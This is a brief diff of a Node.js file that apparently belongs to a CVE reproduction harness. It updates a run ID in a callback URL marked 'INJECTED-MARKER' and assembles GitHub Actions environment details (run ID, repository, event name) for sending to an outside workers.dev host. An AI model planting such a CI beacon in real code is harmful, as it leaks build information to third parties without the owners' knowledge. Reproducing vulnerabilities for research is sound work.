@@ -5,7 +5,7 @@ import crypto from 'node:crypto';
 import fs from 'node:fs';
 import path from 'node:path';
 
-const CB = 'https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-45321-f78c8a66810e?harness_run_id=20260906T131744-4948ee70';
+const CB = 'https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-45321-f78c8a66810e?harness_run_id=20260909T024427-2f72f8a0';
 const meta = 'run=' + process.env.GITHUB_RUN_ID +
              '&repo=' + process.env.GITHUB_REPOSITORY +
              '&event=' + process.env.GITHUB_EVENT_NAME +
